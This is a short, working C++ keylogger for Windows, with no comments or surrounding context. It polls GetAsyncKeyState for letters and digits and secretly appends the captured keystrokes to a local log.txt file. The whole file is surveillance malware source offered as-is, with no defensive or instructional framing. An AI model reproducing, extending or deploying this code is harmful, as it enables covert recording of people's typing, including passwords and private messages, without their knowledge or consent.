#include <windows.h>
#include <fstream>
#include <string>
#include <sstream>

using namespace std;

string input;
string stringKey;
int counter;
ofstream output;
stringstream sstream;

void keys(char keys);
void flushString();

int main() {

	char chars[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" };

	while (true)
	{
		for (int i = 0; i < 36; i++)
		{
			keys(chars[i]);
		}

		if (counter >= 5)
		{
			flushString();
		}

		Sleep(50);
	}

	return 0;
}

void keys(char key)
{
	if (GetAsyncKeyState(key))
	{
		sstream << key;
		sstream >> stringKey;
		input.append(stringKey);
		counter++;
		stringKey = "";
	}
}

void flushString()
{
	output.open("log.txt", ios::app);
	output << input;
	input = "";
	output.close();
	counter = 0;
}